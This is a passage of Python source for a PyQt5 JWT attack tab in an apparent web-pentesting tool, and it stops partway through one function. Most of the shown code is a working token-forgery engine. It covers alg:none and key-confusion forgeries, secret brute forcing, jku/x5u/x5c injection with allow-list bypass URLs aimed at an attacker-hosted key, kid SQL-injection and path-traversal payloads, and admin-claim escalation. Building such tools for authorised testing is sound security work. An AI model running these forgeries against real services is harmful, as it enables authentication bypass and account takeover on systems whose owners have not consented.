"""
jwt_tab.py  –  JWT Analyzer & Attack Lab
=========================================
A professional JWT testing tab for web application pentesting.

Layout (horizontal split):
  ┌──────────────────────────────┬────────────────────────────────────┐
  │  LEFT PANEL                  │  RIGHT PANEL                       │
  │  ┌────────────────────────┐  │  ┌──────────────────────────────┐ │
  │  │  HTTP Request (raw)    │  │  │  🔑 JWT Decoder              │ │
  │  │  [Parse JWT]  [Send]   │  │  │  Header / Payload / Sig      │ │
  │  └────────────────────────┘  │  └──────────────────────────────┘ │
  │  ┌────────────────────────┐  │  ┌──────────────────────────────┐ │
  │  │  🎯 Attack Config      │  │  │  [RES] Attack Results           │ │
  │  │  [x] alg:none/false    │  │  │  table of forged tokens      │ │
  │  │  [x] RS256→HS256       │  │  └──────────────────────────────┘ │
  │  │  [x] Weak secret BF    │  │  ┌──────────────────────────────┐ │
  │  │  [x] jku/x5u inject    │  │  │  ✏️ Token Editor / Preview   │ │
  │  │  [x] kid SQLi/traversal│  │  └──────────────────────────────┘ │
  │  │  [x] Claim tampering   │  │                                    │
  │  │  [Run All] [Run Sel.]  │  │                                    │
  │  └────────────────────────┘  │                                    │
  └──────────────────────────────┴────────────────────────────────────┘
"""

from __future__ import annotations

import re
import json
import base64
import hmac
import hashlib
import time
import ssl
import socket
import urllib.parse
import urllib.request
import urllib.error
import threading
import logging
import copy
import os
from typing import Any, Dict, List, Optional, Tuple
from dataclasses import dataclass, field

# ── gmpy2 availability probe (used by sign2n attack) ──────────────────────────
try:
    import gmpy2 as _gmpy2_lib
    _GMPY2_AVAILABLE: bool = True
except ImportError:
    _gmpy2_lib = None  # type: ignore[assignment]
    _GMPY2_AVAILABLE = False

from PyQt5.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QSplitter, QGroupBox,
    QLabel, QLineEdit, QTextEdit, QPlainTextEdit, QPushButton, QComboBox,
    QTableWidget, QTableWidgetItem, QHeaderView, QTabWidget,
    QCheckBox, QFrame, QApplication, QMenu, QMessageBox,
    QSizePolicy, QSpinBox, QFileDialog, QDialog, QProgressBar,
    QScrollArea, QFormLayout, QToolButton, QAction, QTreeWidget,
    QTreeWidgetItem, QAbstractItemView,
)
from PyQt5.QtCore import Qt, pyqtSignal, QTimer, QThread, pyqtSlot, QSize
from PyQt5.QtGui import QColor, QBrush, QFont, QTextCursor, QTextCharFormat, QSyntaxHighlighter

from constants import (
    COLOR_ELEVATED_BG, COLOR_TEXT, COLOR_TEXT_BRIGHT, COLOR_BORDER,
    COLOR_ACCENT, COLOR_SUCCESS, COLOR_HIGH, COLOR_CRITICAL,
    COLOR_TEXT_MUTED, COLOR_DARK_BG, COLOR_CARD_BG, COLOR_BACKGROUND,
    COLOR_MEDIUM, COLOR_LOW, COLOR_WARNING,
    FONT_SIZE_NORMAL, FONT_SIZE_SMALL, FONT_FAMILY_MONO,
    HttpSyntaxHighlighter,
)

logger = logging.getLogger(__name__)

# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

def _b64url_decode(s: str) -> bytes:
    """Decode a Base64-URL segment, adding padding as needed."""
    s = s.replace("-", "+").replace("_", "/")
    rem = len(s) % 4
    if rem:
        s += "=" * (4 - rem)
    return base64.b64decode(s)


def _b64url_encode(data: bytes) -> str:
    """Encode bytes to Base64-URL without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _split_jwt(token: str) -> Optional[Tuple[str, str, str]]:
    """Split a JWT into (header_b64, payload_b64, signature_b64). Returns None on failure."""
    token = token.strip()
    parts = token.split(".")
    if len(parts) != 3:
        return None
    return parts[0], parts[1], parts[2]


def _decode_part(b64_part: str) -> Optional[dict]:
    """Decode a JWT header or payload part into a dict."""
    try:
        raw = _b64url_decode(b64_part)
        return json.loads(raw.decode("utf-8"))
    except Exception:
        return None


def _encode_part(data: dict) -> str:
    """Encode a dict to JWT Base64-URL segment."""
    return _b64url_encode(json.dumps(data, separators=(",", ":")).encode())


def _sign_hs256(header_b64: str, payload_b64: str, secret: bytes) -> str:
    """Sign a JWT using HMAC-SHA256."""
    msg = f"{header_b64}.{payload_b64}".encode()
    sig = hmac.new(secret, msg, hashlib.sha256).digest()
    return _b64url_encode(sig)


def _extract_jwt_from_request(raw: str) -> Optional[str]:
    """
    Find the first JWT token in a raw HTTP request.
    Searches: Authorization header (Bearer), Cookie header, body.
    """
    # Authorization: Bearer <token>
    m = re.search(r'(?i)Authorization:\s*Bearer\s+(eyJ[\w\-\.]+)', raw)
    if m:
        return m.group(1)
    # Any header containing a JWT-shaped value
    m = re.search(r'(?i)[:\s](eyJ[\w\-]+\.eyJ[\w\-]+\.[\w\-]+)', raw)
    if m:
        return m.group(1)
    # Body
    m = re.search(r'(eyJ[\w\-]+\.eyJ[\w\-]+\.[\w\-]+)', raw)
    if m:
        return m.group(1)
    return None


def _parse_raw_request(raw: str) -> Dict[str, Any]:
    """Parse raw HTTP request text into components."""
    lines = raw.replace("\r\n", "\n").split("\n")
    result: Dict[str, Any] = {
        "method": "GET", "path": "/", "http_version": "HTTP/1.1",
        "headers": {}, "body": "", "host": "",
    }
    if not lines:
        return result
    parts = lines[0].strip().split()
    if len(parts) >= 2:
        result["method"] = parts[0].upper()
        result["path"] = parts[1]
    if len(parts) >= 3:
        result["http_version"] = parts[2]
    i = 1
    while i < len(lines) and lines[i].strip():
        if ":" in lines[i]:
            k, v = lines[i].split(":", 1)
            result["headers"][k.strip()] = v.strip()
            if k.strip().lower() == "host":
                result["host"] = v.strip()
        i += 1
    if i < len(lines):
        result["body"] = "\n".join(lines[i + 1:]).strip()
    return result


def _detect_jwt_location(raw: str) -> str:
    """
    Inspect a raw HTTP request and return the correct jwt_location string:
      'Authorization'   — JWT is in Authorization: Bearer
      'Cookie:<name>'   — JWT is in a cookie named <name>
      'Body'            — JWT is in the request body
    Falls back to 'Authorization' if nothing is detected.
    """
    # Authorization: Bearer
    if re.search(r'(?i)^Authorization:\s*Bearer\s+eyJ', raw, re.MULTILINE):
        return "Authorization"
    # Cookie header — find which cookie name holds the JWT
    cookie_m = re.search(r'(?i)^Cookie:\s*([^\r\n]+)', raw, re.MULTILINE)
    if cookie_m:
        for part in re.split(r';\s*', cookie_m.group(1)):
            if '=' in part:
                name, val = part.split('=', 1)
                if val.strip().startswith('eyJ'):
                    return f"Cookie:{name.strip()}"
    # Request body
    body = raw.split('\n\n', 1)[-1] if '\n\n' in raw else ''
    if re.search(r'eyJ[\w\-]+\.eyJ[\w\-]+\.[\w\-]+', body):
        return 'Body'
    return "Authorization"


def _jwk_rsa_to_pem(jwk: dict) -> str:
    """Convert an RSA JWK (kty='RSA') to an X.509 PEM public key string."""
    from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
    from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
    from cryptography.hazmat.backends import default_backend

    def _b64int(val: str) -> int:
        padded = val + "=" * (-len(val) % 4)
        return int.from_bytes(base64.urlsafe_b64decode(padded), "big")

    n = _b64int(jwk["n"])
    e = _b64int(jwk["e"])
    pub = RSAPublicNumbers(e, n).public_key(default_backend())
    return pub.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo).decode()


# ─────────────────────────────────────────────────────────────────────────────
# JWT Attacks Engine
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class AttackResult:
    name: str
    token: str
    description: str
    severity: str = "Medium"        # Critical / High / Medium / Low / Info
    status_code: int = 0
    response_body: str = ""
    response_headers: Dict[str, str] = field(default_factory=dict)
    elapsed_ms: float = 0.0
    success: bool = False
    error: str = ""
    sent_request: str = ""         # raw HTTP request actually sent (with forged token)
    matches_baseline: Optional[bool] = None  # True = same status+length as baseline (likely bypass)
    canary_hit: bool = False           # True = canary string found in response body


class JWTEngine:
    """All JWT forging and attack logic — pure Python, no external deps."""

    # ── Forge: alg:none ───────────────────────────────────────────────────
    @staticmethod
    def forge_alg_none(header: dict, payload: dict,
                       variants: bool = True) -> List[Tuple[str, str]]:
        """
        Create alg:none tokens.  Returns list of (variant_name, token).
        Tries common 'none' capitalisation tricks to bypass case-sensitive checks.
        """
        none_variants = ["none", "None", "NONE", "nOnE", "NoNe"] if variants else ["none"]
        results = []
        for alg_str in none_variants:
            h = dict(header)
            h["alg"] = alg_str
            h_b64 = _encode_part(h)
            p_b64 = _encode_part(payload)
            token = f"{h_b64}.{p_b64}."   # empty signature
            results.append((f"alg:{alg_str}", token))
        return results

    # ── Forge: algorithm confusion RS256→HS256 ────────────────────────────
    @staticmethod
    def forge_alg_confusion_hs256(header: dict, payload: dict,
                                  public_key_pem: str) -> Tuple[str, str]:
        """
        Sign a token with HS256 where the secret is the server's RSA public key.
        This exploits libs that accept the public key as an HS256 secret.
        Returns (description, forged_token).
        """
        h = dict(header)
        h["alg"] = "HS256"
        h_b64 = _encode_part(h)
        p_b64 = _encode_part(payload)
        secret = public_key_pem.encode() if isinstance(public_key_pem, str) else public_key_pem
        sig = _sign_hs256(h_b64, p_b64, secret)
        token = f"{h_b64}.{p_b64}.{sig}"
        return "RS256→HS256 (pubkey as secret)", token

    # ── Forge: weak secret brute-force ────────────────────────────────────
    @staticmethod
    def brute_force_secret(header_b64: str, payload_b64: str,
                           signature_b64: str,
                           wordlist: List[str]) -> Optional[str]:
        """
        Try each word from the wordlist as an HS256 secret.
        Returns the matching secret or None.
        """
        target_sig = _b64url_decode(signature_b64)
        msg = f"{header_b64}.{payload_b64}".encode()
        for word in wordlist:
            candidate_sig = hmac.new(word.encode(), msg, hashlib.sha256).digest()
            if hmac.compare_digest(candidate_sig, target_sig):
                return word
        return None

    # ── Forge: empty / null signature ────────────────────────────────────
    @staticmethod
    def forge_empty_signature(header: dict, payload: dict) -> List[Tuple[str, str]]:
        """Return tokens with empty, null-byte, or whitespace signatures."""
        h_b64 = _encode_part(header)
        p_b64 = _encode_part(payload)
        return [
            ("Empty signature",    f"{h_b64}.{p_b64}."),
            ("Null byte signature", f"{h_b64}.{p_b64}.{_b64url_encode(b'\\x00')}"),
        ]

    # ── Forge: jku header injection  ──────────────
    @staticmethod
    def forge_jku_injection(header: dict, payload: dict,
                            attacker_url: str,
                            secret: bytes = b"secret",
                            trusted_domain: str = "",
                            km_key_data: Optional[dict] = None,
                            ) -> Tuple[List[Tuple[str, str]], str]:
        """
        Inject jku header pointing to attacker-controlled JWKS.

        Steps:
          1. Generate an RSA key pair (attacker-controlled).
          2. Build a JWKS Set JSON — the attacker hosts this at *attacker_url*.
          3. Set h["alg"]="RS256", h["kid"]=<kid>, h["jku"]=<attacker_url or bypass>.
          4. Sign the token with the attacker private key.

        If *trusted_domain* is supplied, additional tokens are generated using
        URL-filter bypass techniques (fragment, userinfo, open-redirect, etc.)
        that embed the trusted domain so a naive allow-list check is fooled while
        the browser/library still fetches from the attacker-controlled host.

        Returns: (list_of_(name, token), jwks_json_to_host_at_attacker_url)
        """
        import uuid, json as _json, base64 as _b64m
        from urllib.parse import urlparse
        try:
            from cryptography.hazmat.primitives.asymmetric import rsa, padding as _pad
            from cryptography.hazmat.primitives import hashes
            from cryptography.hazmat.backends import default_backend
            import time as _time

            def _i2b(n: int) -> str:
                ln = (n.bit_length() + 7) // 8
                return _b64url_encode(n.to_bytes(ln, "big"))

            # ── Use Key Manager key if provided (same key pair = correct JWKS) ──
            priv_d = (km_key_data or {}).get("_priv_jwk", {})
            if (km_key_data and km_key_data.get("kty") == "RSA"
                    and all(k in priv_d for k in ("n", "e", "d", "p", "q", "dp", "dq", "qi"))):
                def _b2i(s):
                    s = s.replace("-", "+").replace("_", "/")
                    s += "=" * ((4 - len(s) % 4) % 4)
                    return int.from_bytes(_b64m.b64decode(s), "big")
                private_key = rsa.RSAPrivateNumbers(
                    _b2i(priv_d["p"]), _b2i(priv_d["q"]), _b2i(priv_d["d"]),
                    _b2i(priv_d["dp"]), _b2i(priv_d["dq"]), _b2i(priv_d["qi"]),
                    rsa.RSAPublicNumbers(_b2i(priv_d["e"]), _b2i(priv_d["n"]))
                ).private_key(default_backend())
                # Use the canonical top-level kid (what the user sees in Key Manager table)
                attacker_kid = km_key_data.get("kid") or priv_d.get("kid") or str(uuid.uuid4())
                _full_pub = km_key_data.get("_pub_jwk", {})
                pub_jwk = {k: _full_pub[k] for k in ("kty", "kid", "n", "e") if k in _full_pub}
                jwks_json = _json.dumps({"keys": [pub_jwk]}, indent=2)
            else:
                # Generate a fresh ephemeral key pair
                private_key = rsa.generate_private_key(
                    public_exponent=65537, key_size=2048, backend=default_backend()
                )
                pub_nums = private_key.public_key().public_numbers()
                attacker_kid = str(uuid.uuid4())
                pub_jwk = {"kty": "RSA", "kid": attacker_kid,
                           "n": _i2b(pub_nums.n), "e": _i2b(pub_nums.e)}
                jwks_json = _json.dumps({"keys": [pub_jwk]}, indent=2)

            def _sign(hdr: dict, pay: dict, url: str) -> str:
                h = dict(hdr)
                h.update({"alg": "RS256", "kid": attacker_kid, "jku": url})
                for k in ("jwk", "x5u", "x5c"):
                    h.pop(k, None)
                h_b64, p_b64 = _encode_part(h), _encode_part(pay)
                sig_bytes = private_key.sign(
                    f"{h_b64}.{p_b64}".encode(), _pad.PKCS1v15(), hashes.SHA256()
                )
                return f"{h_b64}.{p_b64}.{_b64url_encode(sig_bytes)}"

            res: List[Tuple[str, str]] = []
            res.append(("jku RS256 – original claims", _sign(header, payload, attacker_url)))
            # Generic suffix-based bypasses (no trusted domain required)
            for suffix, label in [
                ("%23bypass",       "encoded-fragment bypass"),
                ("%3Fbypass=1",     "encoded-query bypass"),
                ("?.well-known",    ".well-known suffix bypass"),
            ]:
                res.append((f"jku RS256 [{label}]",
                            _sign(header, payload, f"{attacker_url}{suffix}")))

            # Domain-aware allow-list bypass variants
            if trusted_domain:
                _p = urlparse(attacker_url)
                _scheme = _p.scheme or "https"
                _netloc = _p.netloc or "attacker.com"
                _path_qs = (_p.path or "/jwks.json") + (("?" + _p.query) if _p.query else "")
                _td_bypasses = [
                    # Fragment: allow-list sees trusted domain in fragment, host is attacker's
                    (f"{attacker_url}#{trusted_domain}",
                     f"fragment #{trusted_domain}"),
                    # Encoded fragment
                    (f"{attacker_url}%23{trusted_domain}",
                     f"encoded-fragment #{trusted_domain}"),
                    # Query parameter: filter checks for trusted domain in query string
                    (f"{attacker_url}?x={trusted_domain}",
                     f"query ?x={trusted_domain}"),
                    # URL userinfo: https://trusted.domain.com@attacker.com/jwks.json
                    # Parser sees trusted domain as username; actual host is attacker's
                    (f"{_scheme}://{trusted_domain}@{_netloc}{_path_qs}",
                     f"userinfo @{_netloc}"),
                    # Path confusion: attacker URL contains trusted domain in path
                    (f"{_scheme}://{_netloc}/{trusted_domain}{_path_qs}",
                     f"path-confusion /{trusted_domain}"),
                    # Open-redirect chain: trusted domain redirects to attacker URL
                    (f"https://{trusted_domain}/redirect?url={attacker_url}",
                     f"open-redirect via {trusted_domain}"),
                    # Subdomain of attacker that starts with trusted domain
                    (f"{_scheme}://{trusted_domain}.{_netloc}{_path_qs}",
                     f"subdomain {trusted_domain}.{_netloc}"),
                ]
                for url, label in _td_bypasses:
                    res.append((f"jku [{label}]", _sign(header, payload, url)))

            for changes, lbl in [
                ({"role": "admin", "isAdmin": True},                        "role=admin"),
                ({"roles": ["admin","superadmin"], "scope": "admin:write"}, "roles=[admin]"),
                ({"sub": "administrator", "role": "admin"},                 "sub=administrator"),
            ]:
                res.append((f"jku RS256 + {lbl}",
                            _sign(header, {**payload, **changes}, attacker_url)))
            p_exp = dict(payload)
            p_exp["exp"] = int(_time.time()) + 86400 * 365
            res.append(("jku RS256 + exp +1yr", _sign(header, p_exp, attacker_url)))
            return res, jwks_json

        except ImportError:
            res: List[Tuple[str, str]] = []
            _base_suffixes = [("", "direct"), ("%23bypass", "fragment-bypass"),
                              ("%3Fbypass=1", "query-bypass")]
            if trusted_domain:
                _p = urlparse(attacker_url)
                _scheme = _p.scheme or "https"
                _netloc = _p.netloc or "attacker.com"
                _path_qs = (_p.path or "/jwks.json") + (("?" + _p.query) if _p.query else "")
                _base_suffixes += [
                    (f"#{trusted_domain}",                          f"fragment #{trusted_domain}"),
                    (f"%23{trusted_domain}",                        f"enc-fragment #{trusted_domain}"),
                    (f"?x={trusted_domain}",                        f"query ?x={trusted_domain}"),
                ]
                # userinfo, path, subdomain, open-redirect need full URL construction
                _extra_urls = [
                    (f"{_scheme}://{trusted_domain}@{_netloc}{_path_qs}", f"userinfo @{_netloc}"),
                    (f"{_scheme}://{_netloc}/{trusted_domain}{_path_qs}", f"path-confusion /{trusted_domain}"),
                    (f"https://{trusted_domain}/redirect?url={attacker_url}", f"open-redirect via {trusted_domain}"),
                    (f"{_scheme}://{trusted_domain}.{_netloc}{_path_qs}", f"subdomain {trusted_domain}.{_netloc}"),
                ]
                for url, label in _extra_urls:
                    h = dict(header)
                    h.update({"jku": url, "alg": "HS256"})
                    h.pop("x5u", None)
                    h_b64, p_b64 = _encode_part(h), _encode_part(payload)
                    res.append((f"jku HS256 [{label}]",
                                f"{h_b64}.{p_b64}.{_sign_hs256(h_b64, p_b64, secret)}"))
            for suffix, label in _base_suffixes:
                url = f"{attacker_url}{suffix}"
                h = dict(header)
                h.update({"jku": url, "alg": "HS256"})
                h.pop("x5u", None)
                h_b64, p_b64 = _encode_part(h), _encode_part(payload)
                res.append((f"jku HS256 [{label}]",
                            f"{h_b64}.{p_b64}.{_sign_hs256(h_b64, p_b64, secret)}"))
            return res, '{"keys": []}'

    # ── Forge: x5u header injection ───────────────────────────────────────
    @staticmethod
    def forge_x5u_injection(header: dict, payload: dict,
                            attacker_url: str,
                            secret: bytes = b"secret",
                            ) -> Tuple[List[Tuple[str, str]], str]:
        """
        Inject x5u header pointing to attacker-controlled X.509 cert chain PEM.
        Server fetches the cert, extracts the public key, verifies RS256 signature.
        Returns: (list_of_(name, token), pem_cert_to_host_at_x5u_url)
        """
        import uuid
        try:
            from cryptography.hazmat.primitives.asymmetric import rsa, padding as _pad
            from cryptography.hazmat.primitives import hashes, serialization
            from cryptography.hazmat.backends import default_backend
            from cryptography import x509
            from cryptography.x509.oid import NameOID
            import datetime

            private_key = rsa.generate_private_key(
                public_exponent=65537, key_size=2048, backend=default_backend()
            )
            attacker_kid = str(uuid.uuid4())
            subj = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "attacker")])
            cert = (
                x509.CertificateBuilder()
                .subject_name(subj).issuer_name(subj)
                .public_key(private_key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(datetime.datetime(2020, 1, 1,
                                  tzinfo=datetime.timezone.utc))
                .not_valid_after(datetime.datetime(2030, 1, 1,
                                 tzinfo=datetime.timezone.utc))
                .sign(private_key, hashes.SHA256(), default_backend())
            )
            cert_pem = cert.public_bytes(serialization.Encoding.PEM).decode()

            def _sign(hdr: dict, pay: dict, url: str) -> str:
                h = dict(hdr)
                h.update({"alg": "RS256", "kid": attacker_kid, "x5u": url})
                for k in ("jwk", "jku", "x5c"):
                    h.pop(k, None)
                h_b64, p_b64 = _encode_part(h), _encode_part(pay)
                sig_bytes = private_key.sign(
                    f"{h_b64}.{p_b64}".encode(), _pad.PKCS1v15(), hashes.SHA256()
                )
                return f"{h_b64}.{p_b64}.{_b64url_encode(sig_bytes)}"

            res: List[Tuple[str, str]] = []
            res.append(("x5u RS256 – original claims", _sign(header, payload, attacker_url)))
            for suffix, label in [("%23bypass", "fragment-bypass"), ("%3Fbypass=1", "query-bypass")]:
                res.append((f"x5u RS256 [{label}]",
                            _sign(header, payload, f"{attacker_url}{suffix}")))
            for changes, lbl in [
                ({"role": "admin", "isAdmin": True}, "role=admin"),
                ({"sub": "administrator", "role": "admin"}, "sub=administrator"),
            ]:
                res.append((f"x5u RS256 + {lbl}",
                            _sign(header, {**payload, **changes}, attacker_url)))
            return res, cert_pem

        except ImportError:
            res: List[Tuple[str, str]] = []
            for suffix, label in [("", "direct"), ("%23bypass", "fragment-bypass")]:
                url = f"{attacker_url}{suffix}"
                h = dict(header)
                h.update({"x5u": url, "alg": "HS256"})
                h.pop("jku", None)
                h_b64, p_b64 = _encode_part(h), _encode_part(payload)
                res.append((f"x5u HS256 [{label}]",
                            f"{h_b64}.{p_b64}.{_sign_hs256(h_b64, p_b64, secret)}"))
            return res, "# cryptography not installed"

    # ── Forge: kid SQL injection ──────────────────────────────────────────
    @staticmethod
    def forge_kid_sqli(header: dict, payload: dict) -> List[Tuple[str, str]]:
        """
        SQL injection via kid header parameter.
        If the server uses kid in a DB lookup, UNION SELECT injects a known secret.
        """
        payloads = [
            ("kid SQLi (union '1')",     "x' UNION SELECT '1';--",                           b"1"),
            ("kid SQLi (union secret)",  "' UNION SELECT 'secret'-- -",                       b"secret"),
            ("kid SQLi (0x secret-key)", "' UNION SELECT 0x7365637265742d6b6579-- -",         b"secret-key"),
            ("kid SQLi (char secret)",   "' UNION SELECT CHAR(115,101,99,114,101,116)-- -",   b"secret"),
            ("kid SQLi (sleep probe)",   "' OR SLEEP(0)-- -",                                 b""),
        ]
        results = []
        for name, kid_val, sign_key in payloads:
            h = {**header, "kid": kid_val}
            h_b64, p_b64 = _encode_part(h), _encode_part(payload)
            results.append((name, f"{h_b64}.{p_b64}.{_sign_hs256(h_b64, p_b64, sign_key)}"))
        return results

    # ── Forge: kid path traversal ─────────────────────────────────────────
    @staticmethod
    def forge_kid_traversal(header: dict, payload: dict) -> List[Tuple[str, str]]:
        """
        Path traversal via kid header parameter.
        Forces server to read a predictable static file as the key.
        /dev/null → empty string → sign with empty secret.
        Windows equivalents and known static files also covered.
        Combined priv-esc variants included for highest-impact paths.
        """
        results = []

        def _tok(hdr: dict, pay: dict, sec: bytes) -> str:
            h_b64, p_b64 = _encode_part(hdr), _encode_part(pay)
            return f"{h_b64}.{p_b64}.{_sign_hs256(h_b64, p_b64, sec)}"

        # Blank kid
        results.append(("kid blank (empty secret)", _tok({**header, "kid": ""}, payload, b"")))

        # Linux traversal paths – all signed with empty secret (/dev/null = b"")
        for path in [
            "../../../../../../dev/null",
            "../../../../../dev/null",
            "../../../../dev/null",
            "../../../dev/null",
            "../../dev/null",
            "/dev/null",
            "/proc/sys/kernel/ns_last_pid",
            "/proc/version",
        ]:
            results.append((f"kid traversal {path}", _tok({**header, "kid": path}, payload, b"")))

        # Windows path variants
        for path in [
            "../../../../../../windows/win.ini",
            "C:/Windows/win.ini",
            "C:\\Windows\\win.ini",
            "../../../../../../boot.ini",
        ]:
            results.append((f"kid traversal Win {path[:40]}",
                            _tok({**header, "kid": path}, payload, b"")))

        # Combined: /dev/null traversal + privilege-escalation claims
        for changes, lbl in [
            ({"role": "admin", "isAdmin": True},         "role=admin"),
            ({"sub": "administrator", "role": "admin"},  "sub=administrator"),
        ]:
            h = {**header, "kid": "../../../../../../dev/null"}
            results.append((f"kid traversal /dev/null + {lbl}",
                            _tok(h, {**payload, **changes}, b"")))

        return results

    # ── Forge: x5c header injection (self-signed cert embedded) ──────────
    @staticmethod
    def forge_x5c_injection(header: dict, payload: dict) -> List[Tuple[str, str]]:
        """
        Embed attacker self-signed cert in the x5c header.
        Server extracts the public key from x5c[0] and verifies the RS256 signature.
        The attacker signs with the matching private key.
        Includes priv-esc variants for high-impact coverage.
        """
        try:
            import uuid
            from cryptography.hazmat.primitives.asymmetric import rsa, padding as _pad
            from cryptography.hazmat.primitives import hashes, serialization
            from cryptography.hazmat.backends import default_backend
            from cryptography import x509
            from cryptography.x509.oid import NameOID
            import datetime, base64

            private_key = rsa.generate_private_key(
                public_exponent=65537, key_size=2048, backend=default_backend()
            )
            attacker_kid = str(uuid.uuid4())
            subj = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "attacker")])
            cert = (
                x509.CertificateBuilder()
                .subject_name(subj).issuer_name(subj)
                .public_key(private_key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(datetime.datetime(2020, 1, 1, tzinfo=datetime.timezone.utc))
                .not_valid_after(datetime.datetime(2030, 1, 1, tzinfo=datetime.timezone.utc))
                .sign(private_key, hashes.SHA256(), default_backend())
            )
            cert_der_b64 = base64.b64encode(cert.public_bytes(serialization.Encoding.DER)).decode()

            def _sign(hdr: dict, pay: dict) -> str:
                h = dict(hdr)
                h.update({"alg": "RS256", "kid": attacker_kid, "x5c": [cert_der_b64]})
                for k in ("jwk", "jku", "x5u"):
                    h.pop(k, None)
                h_b64, p_b64 = _encode_part(h), _encode_part(pay)
                sig_bytes = private_key.sign(
                    f"{h_b64}.{p_b64}".encode(), _pad.PKCS1v15(), hashes.SHA256()
                )
                return f"{h_b64}.{p_b64}.{_b64url_encode(sig_bytes)}"

            res: List[Tuple[str, str]] = []
            res.append(("x5c RS256 - original claims", _sign(header, payload)))
            for changes, lbl in [
                ({"role": "admin", "isAdmin": True}, "role=admin"),
                ({"sub": "administrator", "role": "admin"}, "sub=administrator"),
                ({"roles": ["admin", "superadmin"]}, "roles=[admin]"),
            ]:
                res.append((f"x5c RS256 + {lbl}", _sign(header, {**payload, **changes})))
            return res
        except ImportError:
            h = dict(header)
            h.update({"alg": "HS256", "x5c": ["<base64-DER-cert-here>"]})
            for k in ("jwk", "jku", "x5u"):
                h.pop(k, None)
            h_b64, p_b64 = _encode_part(h), _encode_part(payload)
            return [(
                "x5c HS256 (no cryptography)",
                f"{h_b64}.{p_b64}.{_sign_hs256(h_b64, p_b64, b'secret')}"
            )]

    # ── Forge: cty header injection (content-type parser confusion) ───────
    @staticmethod
    def forge_cty_injection(header: dict, payload: dict,
                            secret: bytes = b"secret") -> List[Tuple[str, str]]:
        """
        Inject unusual cty values to probe parser confusion in JWT libraries.
        """
        cty_variants = [
            ("application/json", "cty=JSON (default, baseline)"),
            ("application/jose", "cty=JOSE (nested JWT)"),
            ("application/jose+json", "cty=JOSE+JSON (nested JWT explicit)"),
            ("text/xml", "cty=text/xml (XML parser confusion)"),
            ("application/xml", "cty=application/xml (XML parser)"),
            ("application/x-www-form-urlencoded", "cty=form-urlencoded"),
            ("application/x-java-serialized-object", "cty=Java deserialization"),
            ("application/cbor", "cty=CBOR (binary confusion)"),
            ("application/octet-stream", "cty=octet-stream (binary)"),
            ("", "cty=empty string"),
        ]
        results: List[Tuple[str, str]] = []
        for cty_val, label in cty_variants:
            h = dict(header)
            h["cty"] = cty_val
            h_b64, p_b64 = _encode_part(h), _encode_part(payload)
            results.append((label, f"{h_b64}.{p_b64}.{_sign_hs256(h_b64, p_b64, secret)}"))
        h_nested = dict(header)
        h_nested.update({"cty": "JWT", "alg": "HS256"})
        h_b64, p_b64 = _encode_part(h_nested), _encode_part(payload)
        results.append((
            "cty=JWT (nested JWT wrapper)",
            f"{h_b64}.{p_b64}.{_sign_hs256(h_b64, p_b64, secret)}"
        ))
        return results

    # ── Forge: claim tampering ────────────────────────────────────────────
    @staticmethod
    def forge_claim_tamper(header: dict, payload: dict,
                           claim_changes: Dict[str, Any],
                           secret: bytes = b"secret") -> Tuple[str, str]:
        """Modify specific claims and re-sign (requires known secret)."""
        p = dict(payload)
        p.update(claim_changes)
        h_b64 = _encode_part(header)
        p_b64 = _encode_part(p)
        sig = _sign_hs256(h_b64, p_b64, secret)
        token = f"{h_b64}.{p_b64}.{sig}"
        changes_str = ", ".join(f"{k}={v}" for k, v in claim_changes.items())
        return f"Claim tamper ({changes_str})", token

    # ── Forge: expiry extension ───────────────────────────────────────────
    @staticmethod
    def forge_exp_extension(header: dict, payload: dict,
                            extra_seconds: int = 86400 * 365,
                            secret: bytes = b"secret") -> Tuple[str, str]:
        """Extend exp claim far into the future."""
        p = dict(payload)
        p["exp"] = int(time.time()) + extra_seconds
        if "iat" in p:
            p["iat"] = int(time.time())
        if "nbf" in p:
            p["nbf"] = int(time.time()) - 10
        h_b64 = _encode_part(header)
        p_b64 = _encode_part(p)
        sig = _sign_hs256(h_b64, p_b64, secret)
        token = f"{h_b64}.{p_b64}.{sig}"
        return "Exp extension (+1 year)", token

    # ── Forge: privilege escalation ───────────────────────────────────────
    @staticmethod
    def forge_privilege_escalation(header: dict, payload: dict,
                                   secret: bytes = b"secret") -> List[Tuple[str, str]]:
        """Common privilege escalation claim modifications."""
        escalations = [
            {
                "role": "admin",
                "isAdmin": True,
            },
            {
                "role": "superuser",
                "is_admin": True,
                "admin": True,
            },
            {
                "roles": ["admin", "superadmin"],
                "scope": "admin write read",
            },
            {
                "user_type": "admin",
                "permissions": ["read", "write", "delete", "admin"],
            },
            {
                "group": "admin",
                "groups": ["admin"],
            },
        ]
        results = []
        for changes in escalations:
            p = dict(payload)
            p.update(changes)
            h_b64 = _encode_part(header)
            p_b64 = _encode_part(p)
            sig = _sign_hs256(h_b64, p_b64, secret)
            token = f"{h_b64}.{p_b64}.{sig}"
            changes_str = ", ".join(f"{k}={v}" for k, v in changes.items())
            results.append((f"Priv-esc: {changes_str[:50]}", token))
        return results

    # ── Forge: embedded JWK (CVE-2018-0114 / jwk header injection) ──────
    @staticmethod
    def forge_embedded_jwk(header: dict, payload: dict) -> List[Tuple[str, str]]:
        """
        Inject self-signed JWTs via the jwk header parameter.

        Steps per the technique:
          1. Generate a fresh attacker RSA key pair.
          2. Build the JWK (public key) and give it a matching kid.
          3. Set h["alg"]="RS256", h["kid"]=<attacker_kid>, h["jwk"]=<public_jwk>.
          4. Sign with the attacker private key.

        Produces multiple payload variants to maximise coverage:
          - Original claims unchanged (pure bypass probe)
          - Expiry extended by 1 year
          - Privilege escalation (role/isAdmin)
          - Combined exp + priv-esc

        Requires the `cryptography` package; degrades gracefully to an HS256
        fallback that still exercises the header-injection path.
        """
        import uuid
        try:
            from cryptography.hazmat.primitives.asymmetric import rsa, padding
            from cryptography.hazmat.primitives import hashes
            from cryptography.hazmat.backends import default_backend

            private_key = rsa.generate_private_key(
